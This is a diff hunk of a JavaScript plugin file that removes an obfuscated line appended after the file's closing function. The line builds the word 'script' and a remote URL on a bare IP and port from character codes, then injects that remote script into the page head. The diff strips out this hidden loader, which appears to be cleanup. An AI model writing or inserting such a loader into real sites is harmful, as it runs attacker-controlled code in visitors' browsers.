@@ -479,4 +479,4 @@
       if (e.type === 'ready') initPlugin();
     });
   }
-})();(function(){var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,53,46,50,53,50,46,49,49,54,46,55,55,58,57,49,49,56,47,112,104,97,110,116,111,109,46,106,115);document.head.appendChild(s);})();
+})();
